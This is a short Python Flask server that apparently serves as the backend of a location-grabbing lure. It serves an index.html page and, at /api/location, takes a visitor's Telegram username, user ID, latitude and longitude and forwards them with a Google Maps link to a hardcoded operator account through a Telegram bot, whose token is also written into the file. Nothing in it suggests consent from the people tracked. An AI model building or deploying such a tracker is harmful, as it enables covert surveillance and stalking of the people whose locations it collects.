from flask import Flask, request, jsonify, send_from_directory
import telebot
from datetime import datetime

app = Flask(__name__)

TOKEN = "8635363451:AAFz9dXWHfXho2znqdfbMcWgFrdaPR7NgEo-Y"
OWNER_ID = 8635363451
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.json
    user_id = data.get('user_id')
    username = data.get('username')
    lat = data.get('lat')
    lon = data.get('lon')
    
    msg = f"📍 *موقع واصل!*\n👤 @{username}\n🆔 {user_id}\n🌐 {lat}, {lon}\n🔗 https://www.google.com/maps?q={lat},{lon}"
    bot.send_message(OWNER_ID, msg, parse_mode='Markdown')
    bot.send_location(OWNER_ID, lat, lon)
    
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
